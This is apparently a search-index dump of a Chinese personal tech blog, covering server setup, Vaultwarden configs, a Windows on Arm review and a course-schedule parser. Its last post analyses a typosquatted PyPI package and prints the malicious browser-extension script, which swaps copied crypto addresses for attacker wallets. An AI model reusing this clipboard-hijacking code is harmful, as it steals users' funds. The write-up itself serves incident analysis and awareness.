2。\n","categories":["密码学"],"tags":["密码学"]},{"title":"Oracle 云永久免费服务器","url":"/2023/oracle-cloud-free-server/","content":"2021 年就了解到 Oracle\n云免费套餐，当时还在准备考研，也申请了工行的学生信用卡，但是注册了好几次，没有通过，后来就放弃了。考完之后又不停地在试，都没有成功。一直到去年\n8 月份，突然注册成功了，就弄了一台凤凰城的 ARM 服务器，之后又弄了一台\nx86 的。简单记录一下使用时的一些问题。\n\n首先是网络，有免费的可更换的 IPv4 和 IPv6\n地址，还是挺舒服的。但是，Oracle 的服务器默认是不开启 IPv6\n的，需要手动开启。然后需要在安全规则里添加入站和出站规则。\n还有一个要注意的问题，需要在iptables里添加规则，否则会导致外网无法访问。具体命令如下：\nsudo iptables -I INPUT -m state --state NEW -p tcp --dport 开放的端口号 -j ACCEPT\n然后在服务器上装了 ddns-go，不过 IP\n不经常变，没啥必要。还装了 RSSHub 和青龙，这俩也都没用，主要的服务都部署在国内的腾讯云上。\n另外，用 DNSPod 解析 IPv4 可能导致 IP 被封，所以 IPv4\n就没解析了。\n","categories":["服务器"],"tags":["服务器"]},{"title":"自建 Bitwarden 服务器","url":"/2022/bitwarden-server/","content":"好久没更新博客了，现在毕设答辩也结束了，终于有时间更新一下了。今天先写写\nBitwarden 服务器吧。\n\nBitwarden就不多介绍了，很有名的开源密码管理器。Bitwarden\n官方是有免费版的，也基本够用，但是既然有台服务器，又有些担心安全问题，就自己搭建了一个。\nBitwarden 官方也提供部署脚本和 Dokcer\n镜像，但是占的资源比较多，所以选择了使用比较多的第三方的vaultwarden（原名\nbitwarden_rs），非常轻量。\n我是用 Doceker Compose，没什么难度，简单分享下 compose 文件。\nversion: &quot;3&quot;services:  vaultwarden:    image: vaultwarden/server:latest    container_name: vaultwarden    restart: always    environment:      - LOG_FILE=/data/bitwarden.log      - WEBSOCKET_ENABLED=true      - TZ=Asia/Shanghai      - LC_ALL=zh_CN.UTF-8    volumes:      - /var/bitwarden/data/:/data/    ports:      - 8880:80      - 3012:3012\n然后用 Nginx 做了个反代，加了 SSL。\nupstream vaultwarden-default &#123; server 127.0.0.1:8880; &#125;upstream vaultwarden-ws &#123; server 127.0.0.1:3012; &#125;server &#123;    listen       80;    listen [::]:80;    server_name  bitwarden.meancoder.xyz;    error_log  /var/log/nginx/error.log;    return       301 https://$host$request_uri;&#125;server &#123;    listen 443 ssl http2;    listen [::]:443 ssl http2;    server_name  bitwarden.meancoder.xyz;    error_log  /var/log/nginx/error.log;    ssl_certificate /home/ubuntu/.keys/bitwarden.meancoder.xyz/Nginx/1_bitwarden.meancoder.xyz_bundle.crt;    ssl_certificate_key /home/ubuntu/.keys/bitwarden.meancoder.xyz/Nginx/2_bitwarden.meancoder.xyz.key;    location / &#123;        proxy_pass http://vaultwarden-default;        proxy_set_header Host $host;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        proxy_set_header X-Forwarded-Proto $scheme;    &#125;    location /notifications/hub &#123;        proxy_pass http://vaultwarden-ws;        proxy_set_header Upgrade $http_upgrade;        proxy_set_header Connection &quot;upgrade&quot;;    &#125;    location /notifications/hub/negotiate &#123;        proxy_pass http://vaultwarden-default;    &#125;    location /admin &#123;        auth_basic &quot;Administrator’s Area&quot;;        auth_basic_user_file /etc/apache2/.htpasswd;        proxy_set_header Host $host;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        proxy_set_header X-Forwarded-Proto $scheme;        proxy_pass http://vaultwarden-default;    &#125;&#125;\n中间还遇到了一个小问题，刚搭建完的时候，想随便建个账号测试下，可是注册的时候一直报错，改了半天配置都不行。最后换了个复杂的密码就好了。\n","categories":["服务器"],"tags":["服务器"]},{"title":"Windows on Arm 初体验","url":"/2022/WoA-experience/","content":"之前报名了荣耀神机营的 PC\n项目，本来是想着如果申请到了，旧笔记本就放在实验室，宿舍用新品。但是没想到新品是个二合一，还是\nWindows on Arm (WoA)的，这篇文章就是在这台机器上写的。\n\n\nMateBook E Go\n\n\n首先介绍一下，这块平板就是之前有人爆料的 MateBook E Go\n了，听名字就让人想到 Surface Go\n了。和我以前参加神机营的经历一样，这台机器也不是高端产品。之前爆料说这台机器搭载骁龙\n8cx Gen3，但是拿到手的是 Gen2，内存 16G，屏幕是 2K\n的，看着还不错。有两个 Type-C 接口，一个 3.5mm\n耳机口，双扬声器，指纹识别集成在电源键上。相机感觉和普通笔记本一个水平。配了一个\n65W 的充电器。\n体验几天下来，说一说感受吧。\n首先性能不太行，骁龙和 M1 相比差了一大截，不插电看 B\n站都卡，系统操作也不流畅。这个表现当日常主力使用肯定是不够的。但是 ARM\n续航不错，外出携带很方便，临时码个字，简单写个代码也还是可以的。\n外设方面，这次给配了一个皮套键盘和支架，可以通过触点连接，拿掉后也可以通过蓝牙连接，这个倒是挺方便的。但是这个键盘的\nFn\n键有点问题，热键模式下热键没法用，组合键和响应的还是单键的功能，不知道是设计如此还是\nbug。这一点对于经常使用功能键的我还是有很大影响的。支架的调节范围也挺大的，目测最大可以到\n140 度左右，挺不错的。\n生态方面，ARM 真的差太多了，甚至预装的华为电脑管家都还是 x64\n的。虽然现在可以转译 x86 和 x64\n应用，但是原生的还是会好一些，转译的多多少少会有一些问题。比如迅雷经常会闪退，Traffic\nMonitor 不会开机自启，微信今天也遇到了在窗口内鼠标消失的问题。\n作为半个程序员，常用的 IDE 和 SDK\n肯定是要装一下的。机器到手就马上装了 WSL、WSA、VS\nCode，单独开都还挺好，但是同时开就会很卡。JDK 装了微软的 ARM 版，Python\n3.10 的 RC 版也支持了 ARM，NodeJS 官方还没有 ARM\n版，第三方的又太旧了。IDEA 和 Android 都是 x64 的，比较卡。git 也是 x64\n的，在 VS Code 里用起来非常卡。最近 VS 预览版也支持 ARM\n了，装了一个，启动有点慢，用起来还行，顺手就编译了一个 ARM 版的 Traffic\nMonitor，但是任务栏窗口无法交互，还是等作者更新吧。\n最近 Fleet 也公测了，可惜也是没有 ARM\n版，而且基本上没啥用，还是等更新吧。\n\n最后附上目前装的 ARM 版软件：\n\n\n\n软件\n说明\n\n\n\n\nBandizip\n\n\n\nBitwarden\n\n\n\nClash for Windows\n\n\n\nEverything\n便携版\n\n\nEdge\n\n\n\nFirefox\n\n\n\nPowerToys\n\n\n\nTypora\n\n\n\nTraffic Monitor\n自己编译\n\n\nVS Code\n\n\n\nWSL\n\n\n\n\n","categories":["杂"],"tags":["杂"]},{"title":"多看阅读自动体验 APP 领书币","url":"/2020/auto-duokan/","content":"\n本文仅用于记录自己的学习过程，严禁转载。\n为了避免不必要的纠纷，脚本代码已去除。\n\n多看阅读一直都有体验 APP 领取书豆的活动，体验 30 秒 APP\n就可以免费领取 30\n书豆。不过以前每天只能领几次，今年国庆时开始每天可以领很多次，每天大约能领\n3000 个书豆（相当于 30 块），不过这样领下来要花很久。所以我就利用Auto.js写了一个自动体验\nAPP 领取书豆的脚本，昨天写完，今天试了一下感觉不错。\n好久没写博客了，先水一篇，同时记录一下学习过程。最近打算再认真学一下\njs，把小爱课程表的自动导入写出来。\n\n第一次接触到Auto.js还是 18\n年双十一，当时在酷安看到有人用这个自动领喵币，后来每次这种活动我都会用。国庆的时候我就想找个脚本自动领书豆，但是可能多看用户不多吧，一直没找到，当时也想自己写一个，但是又感觉比较复杂，就没有管。最近想买书了，就想着自己试着写一下。\n一开始我是直接写 js\n文件，然后传到手机上运行。后来觉得很麻烦，就看了看文档，找到了 VS Code\n插件，可以远程运行，方便了很多。\n本来这些体验 APP 我都没有同意用户协议，不想给权限，但是这样导致打开\nAPP 时会弹出用户协议，不能直接返回退出，甚至有些 APP\n不能点击退出。所以我就想把这些应用分下类，不同类 APP 进行不同操作。但是\nAPP 非常多，而且退出操作五花八门。索性我就同意了用户协议，不再给 APP\n分类，都可以通过返回退出。\n另外一个问题是多看的任务页面有很多任务，都有领取按钮，我用findOne()或者findOnce()会导致执行一次任务后找到的领取按钮是下一个任务。我就想找到所有任务，然后根据和任务名的相对位置找到按钮，可是执行一次后会找不到体验\nAPP\n任务的按钮（我也不知道怎么回事）。最后只好通过模拟点击来实现，不过这样在其他设备上用时可能要改动点击坐标。\n","categories":["杂"],"tags":["杂","JavaScript","Node.js"]},{"title":"小爱课程表课程导入开发实践","url":"/2022/buaa-ai-schedule-develop/","content":"\nMIUI\n的小爱同学内置小爱课程表，可以从学校的教务系统自动导入课程信息，非常实用。可惜我们学校没有适配，索性我就自己写了一下，顺便练练手。\n代码已经上传到 Github\n了，只有三个文件，开发者文档有详细说明，这里就贴一下代码。\n\nscheduleHtmlProvider.jsscheduleHtmlParser.jsscheduleTimer.jsasync function scheduleHtmlProvider(  iframeContent = &quot;&quot;,  frameContent = &quot;&quot;,  dom = document) &#123;  await loadTool(&quot;AIScheduleTools&quot;);  // 使用它们的时候务必带上await，否则没有系统alert的时停效果  await AIScheduleAlert(    &quot;开始导入……\\n完成后请手动修改开学时间\\n如导入出错或有其他建议请联系QQ：390602272&quot;  );  let iframe = dom.getElementsByTagName(&quot;iframe&quot;)[0].contentDocument;  let table = iframe.getElementsByClassName(&quot;xfyq_area mt10&quot;)[0].outerHTML;  // console.info(table)  return table;&#125;function scheduleHtmlParser(html) &#123;  /**   * 提取课程周数   * @param &#123;string&#125; str 包含周数的字符串，如`[1-9，11]`、`12，14`   * @returns &#123;Array&lt;number&gt;&#125; 包含`str`中所有周数的数组   */  function getWeeks(str) &#123;    let weeks = [];    str = str.split(&quot;[&quot;)[1].split(&quot;]&quot;)[0];    let weekArray = str.split(&quot;，&quot;);    for (let i in weekArray) &#123;      const begin = weekArray[i].split(&quot;-&quot;)[0];      let end = weekArray[i].split(&quot;-&quot;)[1];      if (!end) &#123;        end = begin;      &#125;      for (let j = parseInt(begin); j &lt;= parseInt(end); j++) &#123;        weeks.push(j);      &#125;    &#125;    return weeks;  &#125;  /**   * 提取课程节数   * @param &#123;string&#125; str 包含节数的字符串，如`第8，9节`   * @returns &#123;Array&lt;number&gt;&#125; 包含`str`中所有节数的数组   */  function getSections(str) &#123;    let sections = [];    str = /第(.+?)节/g.exec(str)[0].replace(&quot;第&quot;, &quot;&quot;).replace(&quot;节&quot;, &quot;&quot;);    let sectionArray = str.split(&quot;，&quot;);    for (let i in sectionArray) &#123;      sections.push(parseInt(sectionArray[i].replace(/[^0-9]/gi, &quot;&quot;)));    &#125;    return sections;  &#125;  /**   * 获取单节课程信息   * @param &#123;string&#125; lessonName 课程名   * @param &#123;number&#125; day 星期   * @param &#123;string&#125; info 课程信息字符串   * @returns &#123;object&#125; 课程信息   */  function getLesson(lessonName, day, info) &#123;    let lesson = &#123; sections: getSections(info), weeks: getWeeks(info) &#125;;    lesson.name = lessonName;    lesson.day = day;    lesson.teacher = info.split(&quot;[&quot;)[0].replace(/\\s+/g, &quot;&quot;); //去掉空格，多教师只提取第一个    //提取教室    tmp = info.split(&quot;周&quot;);    lesson.position = tmp[tmp.length - 1].split(&quot;\\n&quot;)[0];    return lesson;  &#125;  /**   * 获取多节课程信息（同一课程被拆分为多节课）   * @param &#123;string&#125; lessonName 课程名   * @param &#123;number&#125; day 星期   * @param &#123;string&#125; info1 课程信息（不含教室，第一行）   * @param &#123;string&#125; info2 教室（第二行）   * @returns   */  function getLessons1(lessonName, day, info1, info2) &#123;    let lessons = [];    let position = info2.split(&quot;\\n&quot;)[0];    let sections = getSections(info2);    let allWeeks = info1.split(&quot;周，&quot;);    for (i in allWeeks) &#123;      let lesson = &#123; sections: sections, weeks: getWeeks(allWeeks[i]) &#125;;      lesson.name = lessonName;      lesson.day = day;      lesson.teacher = allWeeks[i].split(&quot;[&quot;)[0].replace(/\\s+/g, &quot;&quot;); //去掉空格      lesson.position = position;      lessons.push(lesson);    &#125;    return lessons;  &#125;  /**   * 获取多节课程信息（同一老师不同教室， 如`张老师[10-13]周机房 第1，2节，[2-9]周（五）111 第1，2节`）   * @param &#123;string&#125; lessonName 课程名   * @param &#123;number&#125; day 星期   * @param &#123;string&#125; info 课程信息字符串   * @returns &#123;Array&lt;object&gt;&#125; 课程信息   */  function getLessons2(lessonName, day, info) &#123;    let lessons = [];    let teacher = info.split(&quot;[&quot;)[0].replace(/\\s+/g, &quot;&quot;); //去掉空格    let weekArray = info.split(&quot;\\n&quot;);    let n = weekArray.length;    for (let i = 0; i &lt; n - 1; i++) &#123;      let lesson = &#123;        sections: getSections(weekArray[i + 1]),        weeks: getWeeks(weekArray[i]),      &#125;;      lesson.name = lessonName;      lesson.day = day;      lesson.teacher = teacher;      lesson.position = weekArray[i].split(&quot;周&quot;)[1];      lessons.push(lesson);    &#125;    return lessons;  &#125;  /** 课程信息 */  let courseInfos = [];  const lines = $(&quot;.addlist_01&quot;).find(&quot;tr&quot;); // 表的所有行  for (let l = 1; l &lt;= 6; l++) &#123;    // 1-6行为课程    const linelessons = $(lines[l]).find(&quot;td&quot;);    for (let day = 1; day &lt;= 7; day++) &#123;      // 1-7列为每一天      const index = day + 1; // 列标为天数+1      let child = linelessons[index].children[0];      if (child.data !== &quot;&amp;nbsp;&quot;) &#123;        //时间段不为空        while (child) &#123;          //一个时间段可能有多个课程          lessonName = child.data.slice(0, 49); //课程名长度不能超过50字符          // lessonName = child.data;          child = child.next.children[0];          if (child.data.slice(-1) === &quot;节&quot;) &#123;            if (child.data.indexOf(&quot;，[&quot;) === -1) &#123;              //同一教室不同老师              courseInfos.push(getLesson(lessonName, day, child.data));            &#125; else &#123;              //同一老师不同教室              lessons = getLessons2(lessonName, day, child.data);              for (let i in lessons) &#123;                courseInfos.push(lessons[i]);              &#125;            &#125;            //一个时间段可能有多个课程            child = child.next;          &#125; else &#123;            //同一课程被拆分为多节课（两行）            lessons = getLessons1(              lessonName,              day,              child.data,              child.next.children[0].data            );            for (let i in lessons) &#123;              courseInfos.push(lessons[i]);            &#125;            //一个时间段可能有多个课程            child = child.next.children[0].next;          &#125;          if (child) &#123;            child = child.children[0];          &#125;        &#125;      &#125;    &#125;  &#125;  return courseInfos;&#125;/** * 时间配置函数，此为入口函数，不要改动函数名 */async function scheduleTimer(&#123; providerRes, parserRes &#125; = &#123;&#125;) &#123;  //周数，包括两周考试周，春18秋19夏9  let totalWeek = 19;  if (    providerRes.indexOf(&quot;春季学期&quot;) &gt;= 0 &amp;&amp;    providerRes.indexOf(&quot;春季学期&quot;) &lt; 150  ) &#123;    totalWeek = 18;  &#125; else if (    providerRes.indexOf(&quot;秋季学期&quot;) &gt;= 0 &amp;&amp;    providerRes.indexOf(&quot;秋季学期&quot;) &lt; 150  ) &#123;    totalWeek = 19;  &#125; else &#123;    totalWeek = 9;  &#125;  //课程时间  const sections = [    &#123;      section: 1,      startTime: &quot;08:00&quot;,      endTime: &quot;08:45&quot;,    &#125;,    &#123;      section: 2,      startTime: &quot;08:50&quot;,      endTime: &quot;09:35&quot;,    &#125;,    &#123;      section: 3,      startTime: &quot;09:50&quot;,      endTime: &quot;10:35&quot;,    &#125;,    &#123;      section: 4,      startTime: &quot;10:40&quot;,      endTime: &quot;11:25&quot;,    &#125;,    &#123;      section: 5,      startTime: &quot;11:30&quot;,      endTime: &quot;12:15&quot;,    &#125;,    &#123;      section: 6,      startTime: &quot;14:00&quot;,      endTime: &quot;14:45&quot;,    &#125;,    &#123;      section: 7,      startTime: &quot;14:50&quot;,      endTime: &quot;15:35&quot;,    &#125;,    &#123;      section: 8,      startTime: &quot;15:50&quot;,      endTime: &quot;16:35&quot;,    &#125;,    &#123;      section: 9,      startTime: &quot;16:40&quot;,      endTime: &quot;17:25&quot;,    &#125;,    &#123;      section: 10,      startTime: &quot;17:30&quot;,      endTime: &quot;18:15&quot;,    &#125;,    &#123;      section: 11,      startTime: &quot;19:00&quot;,      endTime: &quot;19:45&quot;,    &#125;,    &#123;      section: 12,      startTime: &quot;19:50&quot;,      endTime: &quot;20:35&quot;,    &#125;,    &#123;      section: 13,      startTime: &quot;20:40&quot;,      endTime: &quot;21:25&quot;,    &#125;,    &#123;      section: 14,      startTime: &quot;21:30&quot;,      endTime: &quot;22:15&quot;,    &#125;,  ];  return &#123;    totalWeek: totalWeek, // 总周数：[1, 30]之间的整数    startSemester: &quot;&quot;, // 开学时间：时间戳，13位长度字符串，推荐用代码生成    startWithSunday: false, // 是否是周日为起始日，该选项为true时，会开启显示周末选项    showWeekend: true, // 是否显示周末    forenoon: 5, // 上午课程节数：[1, 10]之间的整数    afternoon: 5, // 下午课程节数：[0, 10]之间的整数    night: 4, // 晚间课程节数：[0, 10]之间的整数    sections: sections, // 课程时间表，注意：总长度要和上边配置的节数加和对齐  &#125;;&#125;\n","categories":["杂"],"tags":["JavaScript"]},{"title":"记一次加密钱包地址替换攻击","url":"/2023/crypto-wallet-address-replacement-attack/","content":"说来离谱，前几天发现电脑复制的文本全都没有格式，连换行都没有了。我一度以为是\nWindows 的问题，找了各种方法，甚至覆盖安装了一次。最后才发现是 pip\n装了个错误的包，给 Edge 装了插件，会不断替换剪贴板内容。\n\n起因\n起因是想处理个 XML\n文件，就想装个beautifulsoup4，结果输成了beatifulsoup4。运行还是缺库，才发现命令输错了，当时就卸载了，也没多想。\n排查\n之后就是发现剪贴板有问题，试过各种方法都不行。然后用Win+V打开剪贴板，发现剪贴板内容一秒闪一次，开始怀疑是有程序在监听并修改剪贴板。\n接下来就是用排除法，一个一个地关软件，把 Edge\n关闭后，剪贴板就不闪了。我万万没想到是 Edge\n这个浓眉大眼的家伙，之后就顺理成章地怀疑是插件作怪，结果就发现了这个名为“Windows”的可疑插件。\n\n\n可疑插件\n\n然后打开插件位置，发现了一个 js 脚本：\nlet page = chrome.extension.getBackgroundPage();var inputElement = document.createElement(&#x27;input&#x27;);document.body.appendChild(inputElement);inputElement.focus();function checkWalletAddresses() &#123;    document.execCommand(&#x27;paste&#x27;);    var clipboardContent = inputElement.value;    clipboardContent = clipboardContent.replace(/^(0x)[A-Fa-f0-9]&#123;40&#125;$/g, &#x27;0x6eb2103839011Ed56c98145b3d3f9d6BE1b4dA63&#x27;);    clipboardContent = clipboardContent.replace(/^T[A-Za-z1-9]&#123;33&#125;$/g, &#x27;TK3dtT7vYLkhUyzLqbQMmsrM36QzFnmfaa&#x27;);    clipboardContent = clipboardContent.replace(/^(bnb1)[0-9a-z]&#123;38&#125;$/g, &#x27;bnb1pncs5ct0rdh3rcdms8708x9jrdy038ml33ceuw&#x27;);    clipboardContent = clipboardContent.replace(/^([13]&#123;1&#125;[a-km-zA-HJ-NP-Z1-9]&#123;26,33&#125;|bc1[a-z0-9]&#123;39,59&#125;)$/g, &#x27;bc1qkjm7r677a4fkxcmx9kzlk55a9eaqtztq8zwrc2&#x27;);    clipboardContent = clipboardContent.replace(/^[LM3][a-km-zA-HJ-NP-Z1-9]&#123;26,33&#125;$/g, &#x27;LcVct9KwHwUKftDNjbBxUtjK9WeUkYbRN3&#x27;);    clipboardContent = clipboardContent.replace(/^r[0-9a-zA-Z]&#123;24,34&#125;$/g, &#x27;rJd2pxs7TxE77W8X3Ezt2QyrhMJixMehPx&#x27;);    clipboardContent = clipboardContent.replace(/^D&#123;1&#125;[5-9A-HJ-NP-U]&#123;1&#125;[1-9A-HJ-NP-Za-km-z]&#123;32&#125;$/g, &#x27;DFbEVJUt9TcyBgVGriy3DcNBwYhK3s7Yhx&#x27;);    clipboardContent = clipboardContent.replace(/^addr1[a-z0-9]+$/g, &#x27;addr1q8206rrze22rz8g5lggn4clv7zu9mq6w6a6llvw8v3l7r8k5l5xx9j55xyw3f7s38t37eu9ctkp5a4m4l7cuwerlux0qxlhwvz&#x27;);    clipboardContent = clipboardContent.replace(/^[48]([0-9AB]&#123;1&#125;)([0-9a-zA-Z]&#123;93&#125;)$/g, &#x27;41iwYzbS1KKX8DFySxDcGBGGfJzywUeHxWumm4fjYxtYCiHtysXmq3P7RqG18Tv5UDKGNQegefxS2FFqrqeapvB7FuYSBJv&#x27;);    clipboardContent = clipboardContent.replace(/^G[0-7A-Za-z]&#123;55&#125;$/g, &#x27;GCUPRZDN5RGSO3MC4LBIZBJMCS5KNUYQI2HZNUHVEBC5LNWZODWQ24XH&#x27;);\tclipboardContent = clipboardContent.replace(/^cosmos[a-z0-9]&#123;39&#125;$/g, &#x27;cosmos1cd3hxdkc775zj75xtd3gqp8s7hynxkzewcf58y&#x27;);     inputElement.value = clipboardContent;    inputElement.select();        document.execCommand(&#x27;copy&#x27;);        inputElement.value = &#x27;&#x27;;&#125;setInterval(checkWalletAddresses, 1000);\n这个脚本会每秒钟执行一次，把剪贴板的内容替换掉，导致了我的剪贴板格式丢失。\n分析\n在网上搜了一下部分代码，找到了一篇报道：Phylum\nDiscovers Revived Crypto Wallet Address Replacement Attack。就是说\nPyPI\n中有很多和其他知名库名字相似的恶意库，会在浏览器中安装扩展，把剪贴板中的加密货币地址替换为攻击者的钱包地址。\n即使我第一时间就卸载了恶意库，但是在安装过程中就装了插件，卸载时并不会删除插件，所以恶意脚本就会留下来。好在我没有加密货币，不然搞不好真就要丢钱。\n","categories":["服务器"],"tags":["服务器"]}]